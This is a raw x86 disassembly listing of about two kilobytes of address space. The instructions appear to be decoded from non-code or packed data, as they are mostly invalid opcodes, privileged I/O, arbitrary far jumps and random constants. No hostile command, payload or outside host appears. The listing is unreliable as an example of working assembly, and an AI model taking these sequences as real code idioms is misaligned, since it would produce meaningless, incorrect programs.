  41bdf8:	mov    ch,0x4b
  41bdfa:	in     al,dx
  41bdfb:	dec    esp
  41bdfc:	cmc    
  41bdfd:	push   es
  41bdfe:	jl     0x41be4a
  41be00:	push   0xffffffbf
  41be02:	add    esp,DWORD PTR [edx+0x36]
  41be05:	mov    ecx,0x20e76c95
  41be0a:	cmp    al,BYTE PTR [esi+0x7f1ee394]
  41be10:	push   eax
  41be11:	loope  0x41bd9c
  41be13:	loopne 0x41be93
  41be15:	into   
  41be16:	dec    ebx
  41be17:	mov    edi,DWORD PTR [ecx-0x78814ec7]
  41be1d:	ret    0xde9e
  41be20:	(bad)  
  41be21:	jecxz  0x41be9f
  41be23:	popf   
  41be24:	jmp    0x6a6d:0x65f047a0
  41be2b:	inc    ecx
  41be2c:	in     eax,dx
  41be2d:	fdivr  DWORD PTR [esi+0x5b]
  41be30:	pop    ss
  41be31:	test   al,0xe8
  41be33:	mov    edx,0x685106db
  41be38:	mov    ds:0x9802aca6,al
  41be3d:	cdq    
  41be3e:	imul   edx,eax,0x7e
  41be41:	mov    WORD PTR [eax-0x3b],es
  41be44:	push   ss
  41be45:	in     eax,dx
  41be46:	cmc    
  41be47:	fsubr  st,st(2)
  41be49:	sti    
  41be4a:	push   ecx
  41be4b:	lea    edi,[esi]
  41be4d:	xor    esi,DWORD PTR [esi+edi*8-0x67]
  41be51:	cld    
  41be52:	dec    eax
  41be53:	sahf   
  41be54:	cmc    
  41be55:	int    0x1
  41be57:	gs jge 0x41be94
  41be5a:	and    edx,DWORD PTR [edi+0x58420a65]
  41be60:	das    
  41be61:	inc    edi
  41be62:	fild   DWORD PTR [eax+edx*1]
  41be65:	inc    ebp
  41be66:	push   0xffffffec
  41be68:	lahf   
  41be69:	gs xchg edi,eax
  41be6b:	add    eax,0xf478ec5c
  41be70:	sbb    ebx,DWORD PTR [edi-0x1081c5d9]
  41be76:	xchg   edi,eax
  41be77:	and    al,BYTE PTR [eax+0x54bada1b]
  41be7d:	call   0x7130718b
  41be82:	(bad)  
  41be83:	ss jmp 0x6d2d:0xc2341a5a
  41be8b:	out    0x1b,eax
  41be8d:	shr    eax,1
  41be8f:	push   0x175facde
  41be94:	repnz inc ecx
  41be96:	xor    eax,0xf7b3a272
  41be9b:	jecxz  0x41bec0
  41be9d:	mov    edx,0x9753042e
  41bea2:	bound  edx,QWORD PTR [edi-0x59]
  41bea5:	outs   dx,BYTE PTR ds:[esi]
  41bea6:	xor    DWORD PTR [edx+0x71],0xf
  41beaa:	shl    DWORD PTR [ebx-0x6d],cl
  41bead:	and    eax,0x83d4de17
  41beb2:	(bad)
  41beb6:	fwait
  41beb7:	push   ebx
  41beb8:	bound  esi,QWORD PTR [edi+0x3b]
  41bebb:	and    eax,0x2a86a8b2
  41bec0:	inc    edi
  41bec1:	xchg   edi,eax
  41bec2:	ror    DWORD PTR [ebp-0x4c],cl
  41bec5:	fs call 0xc7aa:0x612d8bc4
  41becd:	mov    ebp,0xaa36017a
  41bed2:	sub    ebx,DWORD PTR [esi-0x20b7df22]
  41bed8:	cld    
  41bed9:	addr16 mov ebx,0x63db82f5
  41bedf:	sahf   
  41bee0:	dec    ebx
  41bee1:	mov    cl,0x4c
  41bee3:	jbe    0x41be77
  41bee5:	loopne 0x41bef8
  41bee7:	stos   BYTE PTR es:[edi],al
  41bee8:	loope  0x41bf08
  41beea:	mov    bh,0xc8
  41beec:	pushf  
  41beed:	xor    ecx,edx
  41beef:	add    bl,dl
  41bef1:	pop    ebp
  41bef2:	je     0x41be95
  41bef4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bef5:	fwait
  41bef6:	push   ebp
  41bef7:	xor    ecx,ebp
  41bef9:	jae    0x41bf37
  41befb:	push   ecx
  41befc:	dec    esi
  41befd:	jo     0x41bea4
  41beff:	push   edx
  41bf00:	test   BYTE PTR [edx+0x4a40be22],al
  41bf06:	in     eax,0xc5
  41bf08:	cmp    DWORD PTR [ecx+0x253cbd03],ebx
  41bf0e:	jne    0x41beaf
  41bf10:	sti    
  41bf11:	pop    esi
  41bf12:	out    0xd3,al
  41bf14:	or     DWORD PTR [edi],edx
  41bf16:	xlat   BYTE PTR ds:[ebx]
  41bf17:	call   0xda45:0xce2d9237
  41bf1e:	xchg   si,ax
  41bf20:	mov    ebx,ds
  41bf22:	jno    0x41bee2
  41bf24:	das    
  41bf25:	push   0x30169ea9
  41bf2a:	sbb    al,0x1
  41bf2c:	mov    BYTE PTR [ebp+0x20e25c38],dh
  41bf32:	fs mov ebx,0xbbebc79
  41bf38:	retf   0x2a60
  41bf3b:	shl    BYTE PTR [ebx+0x68],cl
  41bf3e:	xchg   ecx,eax
  41bf3f:	mov    esp,0xa924d7d8
  41bf44:	pop    eax
  41bf45:	retf   0xd910
  41bf48:	pop    edi
  41bf49:	add    eax,DWORD PTR cs:[edi]
  41bf4c:	stos   DWORD PTR es:[edi],eax
  41bf4d:	push   edx
  41bf4e:	ins    BYTE PTR es:[edi],dx
  41bf4f:	add    DWORD PTR [edx-0x69],ecx
  41bf52:	mov    ah,0x34
  41bf54:	aas    
  41bf55:	stos   DWORD PTR es:[edi],eax
  41bf56:	mov    al,ds:0xec75f657
  41bf5b:	popf   
  41bf5c:	loop   0x41bf93
  41bf5e:	in     al,0x4b
  41bf60:	(bad)  
  41bf61:	cmp    edx,edi
  41bf63:	push   0x47
  41bf65:	adc    DWORD PTR [esi+0x59],esp
  41bf68:	xchg   esp,eax
  41bf69:	add    DWORD PTR [ebx+0x270fab4e],edx
  41bf6f:	inc    ebx
  41bf70:	dec    eax
  41bf71:	jmp    0x41bff2
  41bf73:	xor    al,0x72
  41bf75:	lahf   
  41bf76:	mov    ah,0x82
  41bf78:	pop    ebx
  41bf79:	or     bl,BYTE PTR [ecx+eiz*4+0x66f78975]
  41bf80:	hlt    
  41bf81:	mov    ?,WORD PTR [esi]
  41bf83:	jmp    0xa96bbc90
  41bf88:	inc    edx
  41bf89:	lea    ecx,[edx-0x5cef699b]
  41bf8f:	ret    
  41bf90:	arpl   WORD PTR [eax+ecx*4-0x978cb4c],cx
  41bf97:	xchg   ebx,eax
  41bf98:	inc    edi
  41bf99:	ret    
  41bf9a:	xchg   edx,eax
  41bf9b:	ret    0x3f5d
  41bf9e:	xchg   esp,eax
  41bf9f:	sbb    ebx,ecx
  41bfa1:	jo     0x41bf79
  41bfa3:	sar    DWORD PTR [ebp+0x4bfedf79],0x8f
  41bfaa:	das    
  41bfab:	inc    esp
  41bfac:	(bad)  
  41bfae:	xchg   esi,eax
  41bfaf:	sar    DWORD PTR ds:0xa8a0b438,0xb7
  41bfb6:	aas    
  41bfb7:	in     eax,dx
  41bfb8:	(bad)  
  41bfb9:	mov    esp,0x10ed9fa3
  41bfbe:	test   al,0x9
  41bfc0:	and    dh,BYTE PTR [ecx-0x705f982c]
  41bfc6:	aas    
  41bfc7:	lahf   
  41bfc8:	(bad)  
  41bfc9:	xchg   ebx,eax
  41bfca:	les    eax,FWORD PTR [ecx+0x34]
  41bfcd:	adc    al,0xe2
  41bfcf:	push   cs
  41bfd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bfd1:	mov    ds:0x23059191,eax
  41bfd6:	push   cs
  41bfd7:	aas    
  41bfd8:	pop    ebx
  41bfd9:	push   edi
  41bfda:	int    0x4a
  41bfdc:	jmp    0x41bffd
  41bfde:	jecxz  0x41c00f
  41bfe0:	stos   BYTE PTR es:[edi],al
  41bfe1:	arpl   cx,ax
  41bfe3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bfe4:	add    BYTE PTR [eax],ah
  41bfe6:	hlt    
  41bfe7:	std    
  41bfe8:	mov    eax,ss:0xd72ecf4b
  41bfee:	mov    edx,0x5406bb88
  41bff3:	adc    BYTE PTR [ecx-0x4e],ch
  41bff6:	mov    ds,WORD PTR [ebx]
  41bff8:	cli    
  41bff9:	fist   DWORD PTR [edi+0x4d]
  41bffc:	adc    DWORD PTR [edi-0xf],eax
  41bfff:	pop    ecx
  41c000:	scas   al,BYTE PTR es:[edi]
  41c001:	jns    0x41c05f
  41c003:	dec    ecx
  41c004:	sub    al,0x25
  41c006:	in     eax,0x40
  41c008:	dec    ebp
  41c009:	add    al,0x2
  41c00b:	inc    ecx
  41c00c:	enter  0x9510,0x35
  41c010:	daa    
  41c011:	adc    BYTE PTR [ecx+0x57dfb97],ch
  41c017:	or     bh,BYTE PTR [ecx]
  41c019:	ins    DWORD PTR es:[edi],dx
  41c01a:	jae    0x41c067
  41c01c:	inc    eax
  41c01d:	cmp    ecx,ebx
  41c01f:	scas   eax,DWORD PTR es:[edi]
  41c020:	das    
  41c021:	aaa    
  41c022:	shr    BYTE PTR [edi+edi*2-0x52e1bbf],1
  41c029:	fidivr WORD PTR ds:0xb309baa1
  41c02f:	dec    BYTE PTR [ecx]
  41c031:	imul   ebp,DWORD PTR [esi],0x6475d5b3
  41c037:	jmp    0x6338:0x7bd06d39
  41c03e:	jecxz  0x41c047
  41c040:	cmp    ch,dl
  41c042:	js     0x41c073
  41c044:	cmp    esi,ecx
  41c046:	gs inc edx
  41c048:	int    0xc8
  41c04a:	(bad)  [esi+0x43]
  41c04d:	lods   al,BYTE PTR ds:[esi]
  41c04e:	call   0x4595:0xfcebaa60
  41c055:	inc    edx
  41c056:	wbinvd 
  41c058:	mov    eax,ds:0x2a45dde4
  41c05d:	push   ebx
  41c05e:	dec    esp
  41c05f:	add    dh,BYTE PTR [eax]
  41c061:	outs   dx,DWORD PTR ds:[esi]
  41c062:	sub    esp,0xffffffbb
  41c065:	mov    esi,0xeb0e8ab9
  41c06a:	rcr    ebp,1
  41c06c:	sub    DWORD PTR [ecx-0xc],0xe39d8d90
  41c073:	adc    al,0x8a
  41c075:	mov    BYTE PTR [esp+ebp*2-0x2538ed1d],al
  41c07c:	sbb    BYTE PTR [ecx+eax*4-0x7f],ah
  41c080:	cld    
  41c081:	test   eax,0xb08c2294
  41c086:	jmp    0x41c06c
  41c088:	pushf  
  41c089:	(bad)  
  41c08b:	out    dx,al
  41c08c:	push   cs
  41c08d:	sbb    DWORD PTR [eax],ebx
  41c08f:	daa    
  41c090:	push   ds
  41c091:	rcl    BYTE PTR [edi],cl
  41c093:	mov    bh,0x7f
  41c095:	adc    al,0x9d
  41c097:	sbb    edi,ecx
  41c099:	and    al,0xf7
  41c09b:	bound  edx,QWORD PTR [ecx+0x42]
  41c09e:	test   al,0x9f
  41c0a0:	jle    0x41c117
  41c0a2:	mov    eax,0x69e39615
  41c0a7:	mov    ecx,0x290d6432
  41c0ac:	repnz cs inc esi
  41c0af:	cmp    DWORD PTR [ebp-0x10],esi
  41c0b2:	sbb    al,0xb4
  41c0b4:	int    0x93
  41c0b6:	std    
  41c0b7:	cmp    eax,DWORD PTR [eax]
	...
  41c0c1:	retf   
  41c0c2:	test   al,0x91
  41c0c4:	sbb    eax,0xfecf3df3
  41c0c9:	dec    ebp
  41c0ca:	fisub  DWORD PTR [ecx+edi*1+0x5b]
  41c0ce:	bnd jp 0x41c123
  41c0d1:	mov    WORD PTR ds:0x3af0001,?
  41c0d7:	add    BYTE PTR [eax],al
  41c0d9:	dec    esp
  41c0da:	std    
  41c0db:	mov    WORD PTR [edi],es
  41c0dd:	xchg   edi,eax
  41c0de:	gs inc esi
  41c0e0:	aaa    
  41c0e1:	xor    eax,0x539a6cda
  41c0e6:	into   
  41c0e7:	pop    ecx
  41c0e9:	mov    ecx,0xc1f184e2
  41c0ee:	add    ecx,ebp
  41c0f0:	pop    ebp
  41c0f1:	loope  0x41c09a
  41c0f3:	dec    ebx
  41c0f4:	and    BYTE PTR [esi+edi*1],0x65
  41c0f8:	ret    0xb488
  41c0fb:	add    ah,ah
  41c0fd:	fmul   DWORD PTR [edx+0x710d1193]
  41c103:	push   esi
  41c104:	pop    edi
  41c105:	sbb    eax,0x73961b68
  41c10a:	and    esp,DWORD PTR [edx+0x40541529]
  41c110:	xor    al,0x34
  41c112:	add    bh,BYTE PTR [edi-0x5]
  41c115:	cdq    
  41c116:	outs   dx,BYTE PTR ds:[esi]
  41c117:	(bad)  
  41c119:	sbb    eax,0xb1207ea1
  41c11e:	xchg   ebx,eax
  41c11f:	sub    esp,DWORD PTR [ebp-0x77]
  41c122:	sub    ebp,DWORD PTR [ebp-0x56]
  41c125:	fisttp WORD PTR [esi-0x48]
  41c128:	push   ss
  41c129:	shr    ah,cl
  41c12b:	and    al,0xae
  41c12d:	(bad)  
  41c12e:	dec    al
  41c130:	daa    
  41c131:	jns    0x41c0f1
  41c133:	inc    ecx
  41c134:	push   ebp
  41c135:	mov    ch,0x5f
  41c137:	mov    cs,WORD PTR [edx+0x468e244f]
  41c13d:	int3   
  41c13e:	shl    DWORD PTR [esi],cl
  41c140:	or     ebp,DWORD PTR [edx+0x3997f5fd]
  41c146:	mov    cl,0x80
  41c148:	test   esp,esp
  41c14a:	dec    edx
  41c14b:	ror    DWORD PTR ds:0xb1286f2a,cl
  41c151:	jmp    0x75b81e6a
  41c156:	pop    ds
  41c157:	and    eax,0x144cbca1
  41c15c:	mov    DWORD PTR [ebx-0x5e],edi
  41c15f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c160:	adc    DWORD PTR [edi+eax*4-0x29],esi
  41c164:	add    BYTE PTR [edx+ecx*4+0xd],0xc8
  41c169:	enter  0xa2ec,0x4b
  41c16d:	mov    edi,0x9ade3dea
  41c172:	shr    BYTE PTR [ebx-0x14],0x48
  41c176:	retf   
  41c177:	rcl    DWORD PTR [edx-0x5b6bd9cf],1
  41c17d:	fisttp WORD PTR [eax-0x44]
  41c180:	jle    0x41c1ed
  41c182:	fmul   st,st(1)
  41c184:	dec    ebp
  41c185:	stos   BYTE PTR es:[edi],al
  41c186:	(bad)  
  41c187:	and    edi,ebp
  41c189:	(bad)  
  41c18a:	push   edx
  41c18b:	out    dx,eax
  41c18c:	jno    0x41c161
  41c18e:	sub    eax,0x197bffc6
  41c193:	std    
  41c194:	push   ss
  41c195:	aam    0x1c
  41c197:	inc    esp
  41c198:	mov    ss:0x72c7403a,eax
  41c19e:	cmp    BYTE PTR [ebx-0x2],bh
  41c1a1:	fnsave [edx+0x16f14c5d]
  41c1a7:	push   eax
  41c1a8:	jmp    0x81db7d19
  41c1ad:	or     BYTE PTR [esi+0x6e3acee2],dl
  41c1b3:	inc    ecx
  41c1b4:	adc    eax,0xb3c9a3f8
  41c1b9:	inc    ebx
  41c1ba:	arpl   WORD PTR [eax+eiz*4],bp
  41c1bd:	ins    DWORD PTR es:[edi],dx
  41c1be:	jo     0x41c1d0
  41c1c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1c1:	out    0x1d,eax
  41c1c3:	mov    cl,0xf3
  41c1c5:	mov    ebp,0x4bff943b
  41c1ca:	xchg   edx,eax
  41c1cb:	enter  0x742,0x4e
  41c1cf:	add    eax,0xa5500c20
  41c1d4:	ins    DWORD PTR es:[edi],dx
  41c1d5:	jmp    0x2d7ff93e
  41c1da:	jecxz  0x41c1c1
  41c1dc:	mov    gs,WORD PTR ds:0x1dbf53e9
  41c1e2:	pop    ecx
  41c1e3:	out    dx,eax
  41c1e4:	dec    ecx
  41c1e5:	call   0xeb72:0x275b0432
  41c1ec:	(bad)  
  41c1ed:	aad    0x1c
  41c1ef:	mov    BYTE PTR [ebx+0x1b],0xcc
  41c1f3:	inc    ebp
  41c1f4:	or     al,0x6b
  41c1f6:	xchg   ebx,eax
  41c1f7:	mov    ah,0x90
  41c1f9:	dec    edi
  41c1fa:	sub    BYTE PTR [ecx],bl
  41c1fc:	xchg   BYTE PTR ds:0xf21cfb2e,ah
  41c202:	lods   al,BYTE PTR ds:[esi]
  41c203:	shr    BYTE PTR [edx+edx*1],0x36
  41c207:	mov    dh,0x13
  41c209:	add    al,0xa3
  41c20b:	add    BYTE PTR [edx-0x14],0x58
  41c20f:	in     al,0x90
  41c211:	sub    ah,BYTE PTR [ebp-0x7596fc1f]
  41c217:	sbb    dh,BYTE PTR [esp+esi*4-0x2cf2facb]
  41c21e:	nop
  41c21f:	outs   dx,BYTE PTR ds:[esi]
  41c220:	pop    esp
  41c221:	pushf  
  41c222:	mov    ah,0x0
  41c224:	data16 jae 0x41c245
  41c227:	pop    ecx
  41c228:	retf   
  41c229:	add    al,0x6d
  41c22b:	and    al,0xf9
  41c22d:	mov    edx,0x60e6c23d
  41c232:	mov    eax,ds:0x24ee70f7
  41c237:	or     ebp,DWORD PTR [eax]
  41c239:	aas    
  41c23a:	sbb    bl,bh
  41c23c:	push   edi
  41c23d:	pop    eax
  41c23e:	inc    esi
  41c23f:	add    bl,ch
  41c241:	sahf   
  41c242:	jl     0x41c1ea
  41c244:	les    ecx,FWORD PTR [esi-0x10]
  41c247:	mov    esp,0xc3b02621
  41c24c:	push   ecx
  41c24d:	ss dec ebp
  41c24f:	jmp    0x312b6ba8
  41c254:	stc    
  41c255:	add    ecx,DWORD PTR [ecx-0x543f8a89]
  41c25b:	shr    DWORD PTR [edi+ebp*1],cl
  41c25e:	adc    edi,DWORD PTR [ecx]
  41c260:	je     0x41c228
  41c262:	push   ecx
  41c263:	and    al,0x2c
  41c265:	mov    WORD PTR [eax],es
  41c267:	pop    edx
  41c268:	into   
  41c269:	retf   
  41c26a:	das    
  41c26b:	jp     0x41c2e1
  41c26d:	and    DWORD PTR gs:[esi],ecx
  41c270:	mov    edx,0x5c25f323
  41c275:	jne    0x41c24f
  41c277:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c278:	sub    eax,0xd47a0deb
  41c27d:	jl     0x41c2a7
  41c27f:	jmp    0x41c27b
  41c281:	cwde   
  41c282:	mov    ss,edx
  41c284:	mov    DWORD PTR [eax+0x41],edx
  41c287:	sub    DWORD PTR [ecx],ecx
  41c289:	fistp  WORD PTR [ecx+eax*4-0x51]
  41c28d:	or     eax,0x904a14ff
  41c292:	add    BYTE PTR [ecx+0x71bc601],al
  41c298:	rol    DWORD PTR [ecx+0x75f61b1f],1
  41c29e:	adc    eax,0xe0d1f4a6
  41c2a3:	test   al,0xf8
  41c2a5:	push   eax
  41c2a6:	jmp    0x60a:0x172b0728
  41c2ad:	icebp  
  41c2ae:	popa   
  41c2af:	lock xchg edx,eax
  41c2b1:	push   edx
  41c2b2:	ror    BYTE PTR [esp+eiz*2+0x5e],0xbb
  41c2b7:	dec    ecx
  41c2b8:	dec    ebx
  41c2b9:	imul   eax,DWORD PTR [eax],0xff239aa7
  41c2bf:	cmp    DWORD PTR [ebx+0x4a],esp
  41c2c2:	into   
  41c2c3:	and    al,0x5b
  41c2c5:	data16 mov dh,0xd9
  41c2c8:	fcomp  DWORD PTR ds:0xe06b00f5
  41c2ce:	adc    esp,DWORD PTR [ebx]
  41c2d0:	mov    dh,0x28
  41c2d2:	push   ss
  41c2d3:	xchg   esi,eax
  41c2d4:	std    
  41c2d5:	push   ebx
  41c2d6:	(bad)  
  41c2d7:	in     al,dx
  41c2d8:	and    BYTE PTR [edi-0x2c27a74e],bl
  41c2de:	test   DWORD PTR [ebp+0x6a9dd1aa],ecx
  41c2e4:	out    0xdb,eax
  41c2e6:	mov    ebp,0xcf1b2d8d
  41c2eb:	stos   BYTE PTR es:[edi],al
  41c2ec:	fwait
  41c2ed:	das    
  41c2ee:	sahf   
  41c2ef:	mov    ch,0xd1
  41c2f1:	lds    ebx,FWORD PTR [eax+0x5d]
  41c2f4:	mov    ebp,0x758431c5
  41c2f9:	pop    ebp
  41c2fa:	cmp    BYTE PTR [ecx],ch
  41c2fc:	arpl   WORD PTR [ebx+0x5e561a15],sp
  41c302:	push   0x1
  41c304:	inc    DWORD PTR [edi+edx*1]
  41c307:	out    dx,al
  41c308:	xchg   eax,ecx
  41c30a:	into   
  41c30b:	hlt    
  41c30c:	retf   
  41c30d:	scas   al,BYTE PTR es:[edi]
  41c30e:	retf   
  41c30f:	add    esi,DWORD PTR [ecx-0x9]
  41c312:	pop    ebx
  41c313:	push   edi
  41c314:	and    eax,0x576be0d7
  41c319:	mov    dh,0xa5
  41c31b:	stos   DWORD PTR es:[edi],eax
  41c31c:	cwde   
  41c31d:	outs   dx,BYTE PTR ds:[esi]
  41c31e:	or     al,0xf8
  41c320:	sti    
  41c321:	popa   
  41c322:	dec    esp
  41c323:	push   ss
  41c324:	xchg   edi,eax
  41c325:	prefetch BYTE PTR [eax+0x2d]
  41c329:	stos   DWORD PTR es:[edi],eax
  41c32a:	xor    BYTE PTR [esi+edi*8+0x1867003a],ch
  41c331:	push   edi
  41c332:	repnz xor ebp,esp
  41c335:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c336:	fld    DWORD PTR [ebp+0x60d15b2]
  41c33c:	ss retf 
  41c33e:	jl     0x41c2ca
  41c340:	cs ss xor eax,0xc424914a
  41c347:	or     al,0x75
  41c349:	and    eax,0x19fe9b9c
  41c34e:	sub    DWORD PTR [edx-0x559f32e],esp
  41c354:	je     0x41c32c
  41c356:	cmp    eax,eax
  41c358:	mov    eax,ds:0x27bdc988
  41c35d:	or     esp,DWORD PTR [ebp+0x39da5198]
  41c363:	mov    al,ds:0xb5c12fc6
  41c368:	push   ecx
  41c369:	aad    0x69
  41c36b:	sbb    al,0x60
  41c36d:	and    eax,0x94752cc1
  41c372:	xchg   ecx,eax
  41c373:	add    BYTE PTR [edi],dl
  41c375:	xchg   ebx,eax
  41c376:	ja     0x41c3d7
  41c378:	dec    ebx
  41c379:	jge    0x41c346
  41c37b:	and    dh,BYTE PTR [edx]
  41c37d:	push   ss
  41c37e:	xor    cl,cl
  41c380:	and    ecx,DWORD PTR [ecx+0x16]
  41c383:	xor    DWORD PTR [ecx],esp
  41c385:	cmp    ebp,DWORD PTR [eax+edi*1+0x58]
  41c389:	cmp    al,0x6c
  41c38b:	stos   DWORD PTR es:[edi],eax
  41c38c:	mov    ah,0x75
  41c38e:	call   0x194e:0xe2f733a8
  41c395:	mov    ecx,0x774ea4ef
  41c39a:	repz xor eax,0x60db9160
  41c3a0:	(bad)  
  41c3a1:	lock ret 
  41c3a3:	rcl    dh,cl
  41c3a5:	push   ecx
  41c3a6:	jp     0x41c394
  41c3a8:	popa   
  41c3a9:	dec    esi
  41c3aa:	jnp    0x41c3c2
  41c3ac:	ins    BYTE PTR es:[edi],dx
  41c3ad:	aam    0x83
  41c3af:	add    al,0xdd
  41c3b1:	jns    0x41c3ad
  41c3b3:	mov    ebp,0xf066c06a
  41c3b8:	mov    dl,0x3
  41c3ba:	lods   al,BYTE PTR ds:[esi]
  41c3bb:	gs cwde 
  41c3bd:	sub    eax,0x9667b9b9
  41c3c2:	test   BYTE PTR [ecx-0x54725e0c],bl
  41c3c8:	test   eax,0xc8b04609
  41c3cd:	ret    0x121
  41c3d0:	mov    ds:0xd63f908d,al
  41c3d5:	inc    DWORD PTR [edx+0x69767eb5]
  41c3db:	loop   0x41c3db
  41c3dd:	inc    esi
  41c3de:	fucom  st(4)
  41c3e0:	xchg   edi,eax
  41c3e1:	ss pop ecx
  41c3e3:	int3   
  41c3e4:	push   ebx
  41c3e5:	shl    eax,cl
  41c3e7:	mov    dh,0xf8
  41c3e9:	mov    dl,BYTE PTR [edi-0x6a6e8da2]
  41c3ef:	fcom   st(3)
  41c3f1:	and    eax,0xbd187561
  41c3f6:	inc    ecx
  41c3f7:	ds into 
  41c3f9:	jns    0x41c38e
  41c3fb:	and    edi,DWORD PTR [esi+edx*1+0x621561e6]
  41c402:	aas    
  41c403:	adc    eax,0x6479af0f
  41c408:	dec    esp
  41c409:	sub    eax,0x7d9926f9
  41c40e:	xchg   edx,eax
  41c40f:	in     eax,0x11
  41c411:	cmp    eax,DWORD PTR [eax]
  41c413:	in     eax,0x59
  41c415:	sbb    al,0xd7
  41c417:	dec    edi
  41c418:	inc    esp
  41c419:	jnp    0x41c448
  41c41b:	jle    0x41c497
  41c41d:	or     esp,esi
  41c41f:	in     eax,dx
  41c420:	fbld   TBYTE PTR [edx+0x399d4df]
  41c426:	test   dl,ah
  41c428:	xlat   BYTE PTR ds:[ebx]
  41c429:	test   dh,cl
  41c42b:	mov    bh,0x51
  41c42d:	sub    DWORD PTR [edx],esi
  41c42f:	sub    bl,bh
  41c431:	and    ecx,DWORD PTR [edx]
  41c433:	call   0xdda:0xb06a0411
  41c43a:	push   es
  41c43b:	imul   eax,DWORD PTR [esi+0x6a6f2ff9],0xffffff94
  41c442:	loope  0x41c44e
  41c444:	cld    
  41c445:	pop    eax
  41c446:	push   edi
  41c447:	push   0xc2229901
  41c44c:	jmp    0x9417:0x4009c59a
  41c453:	bound  eax,QWORD PTR [eax+0x4efa9121]
  41c459:	and    ah,al
  41c45b:	xchg   esp,eax
  41c45c:	xor    eax,0xb23d82e4
  41c461:	sbb    ebp,DWORD PTR [esi-0x3d]
  41c464:	xor    BYTE PTR [ebx-0x32e75ea5],0x1f
  41c46b:	cmp    DWORD PTR [ebp+0x43],edi
  41c46e:	push   ss
  41c46f:	ror    DWORD PTR [ecx-0x28bb9bcf],0x76
  41c476:	popa   
  41c477:	dec    ecx
  41c478:	test   eax,0xef81a939
  41c47d:	in     eax,0x1a
  41c47f:	into   
  41c480:	shl    DWORD PTR [ecx-0x23887cfa],0x81
  41c487:	inc    BYTE PTR [eax]
	...
  41c491:	mov    ah,0x4f
  41c493:	sbb    al,0x53
  41c495:	call   DWORD PTR [ebx-0x1]
  41c498:	out    dx,eax
  41c499:	inc    esi
  41c49a:	dec    esp
  41c49b:	add    eax,0x2b27f232
  41c4a0:	stc    
  41c4a1:	cmp    eax,DWORD PTR [ecx+0x1]
  41c4a4:	add    BYTE PTR [edi-0x54fffffd],ch
  41c4aa:	loop   0x41c49e
  41c4ac:	xor    BYTE PTR [ebx+0x73],0xbc
  41c4b0:	pop    edi
  41c4b1:	xchg   esp,eax
  41c4b2:	or     ebx,0xfffffffc
  41c4b5:	cmc    
  41c4b6:	cwde   
  41c4b7:	mov    ds:0x66e8dcfe,al
  41c4bc:	xor    eax,0x6f1fcc45
  41c4c1:	in     al,0x29
  41c4c3:	fdivr  DWORD PTR [edx]
  41c4c5:	test   eax,0xeb1480f8
  41c4ca:	popf   
  41c4cb:	push   0xffffffdf
  41c4cd:	retf   0xe31b
  41c4d0:	or     DWORD PTR [edx+0x3907401f],esp
  41c4d6:	in     al,0xc1
  41c4d8:	mov    ah,0x22
  41c4da:	adc    esp,edx
  41c4dc:	xchg   esp,eax
  41c4dd:	ret    
  41c4de:	xchg   edi,eax
  41c4df:	scas   al,BYTE PTR es:[edi]
  41c4e0:	out    0xf4,eax
  41c4e2:	pop    ecx
  41c4e3:	jl     0x41c485
  41c4e5:	sahf   
  41c4e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4e7:	sub    DWORD PTR [edi],ecx
  41c4e9:	jne    0x41c4d9
  41c4eb:	xchg   DWORD PTR [eax],ecx
  41c4ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4ee:	sub    esi,ebx
  41c4f0:	mov    ah,0xcf
  41c4f2:	inc    esp
  41c4f3:	adc    BYTE PTR [ebx-0x6],bl
  41c4f6:	int3   
  41c4f7:	mov    ch,0xaa
  41c4f9:	pop    edx
  41c4fa:	jmp    0xb161c35a
  41c4ff:	mov    edi,0x66df25c0
  41c504:	pop    ebx
  41c505:	push   0xaf0d27a8
  41c50a:	fsubr  QWORD PTR [edi+edi*4-0x6c84b47d]
  41c511:	cld    
  41c512:	leave  
  41c513:	inc    esi
  41c514:	fldenv [edx-0x6a]
  41c517:	lock mov eax,0x29b860dd
  41c51d:	ins    BYTE PTR es:[edi],dx
  41c51e:	mov    edi,0xa77b0f20
  41c523:	mov    ah,al
  41c525:	add    bl,ah
  41c527:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c528:	fwait
  41c529:	mov    ah,0x39
  41c52b:	and    edi,DWORD PTR [edx+0x34]
  41c52e:	xchg   BYTE PTR [edx+ebx*1-0x74fd510e],ch
  41c535:	jmp    0x41c50f
  41c537:	popa   
  41c538:	mov    ch,0x97
  41c53a:	mov    ecx,0x6b50677f
  41c53f:	test   BYTE PTR [edx-0x40],0xc1
  41c543:	mov    dh,bh
  41c545:	fidiv  WORD PTR [ebx-0x5f86807f]
  41c54b:	into   
  41c54c:	xchg   bh,ch
  41c54e:	mov    ah,0x4c
  41c550:	add    ecx,DWORD PTR [esi-0x2a]
  41c553:	call   0xb13f:0x6e13aa4c
  41c55a:	in     al,0x33
  41c55c:	call   0xe9b3a438
  41c561:	in     al,dx
  41c562:	mov    BYTE PTR [edx],cl
  41c564:	cmp    eax,0x16e18106
  41c569:	and    al,BYTE PTR [ebp-0x2f]
  41c56c:	mov    edi,es
  41c56e:	fstp   TBYTE PTR [edi]
  41c570:	inc    esp
  41c571:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c572:	pop    esp
  41c573:	dec    ebp
  41c574:	jle    0x41c5e8
  41c576:	dec    edx
  41c577:	popa   
  41c578:	aam    0x84
  41c57a:	(bad)  
  41c57b:	in     al,dx
  41c57c:	dec    ebx
  41c57d:	fdivr  QWORD PTR [eax]
  41c57f:	hlt    
  41c580:	shr    BYTE PTR [ebx-0x29],1
  41c583:	daa    
  41c584:	cwde   
  41c585:	and    al,0x34
  41c587:	mov    eax,0xed78991
  41c58c:	mov    cs,WORD PTR [edi+0x3bbd49d0]
  41c592:	gs mov edi,0x2c15b818
  41c598:	and    bh,BYTE PTR [ecx-0x62]
  41c59b:	ja     0x41c5cf
  41c59d:	mov    ah,0x33
  41c59f:	cmp    eax,0x74cff73a
  41c5a4:	push   esi
  41c5a5:	test   BYTE PTR [edx-0x7c57691c],0xb2
